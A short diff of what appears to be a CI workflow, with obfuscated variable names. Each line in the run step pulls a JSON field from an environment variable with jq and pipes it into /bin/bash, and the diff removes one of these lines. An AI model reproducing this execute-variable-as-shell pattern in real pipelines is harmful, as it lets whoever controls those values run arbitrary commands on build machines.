@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$taog6" | jq -r .m8398 | /bin/bash
           printf '%s' "$rpci517" | jq -r .ajlsp9064 | /bin/bash
-          printf '%s' "$amt52" | jq -r .ih22022 | /bin/bash
           printf '%s' "$dhb13342" | jq -r .ju065 | /bin/bash
           printf '%s' "$nza48323" | jq -r .p69132 | /bin/bash
 
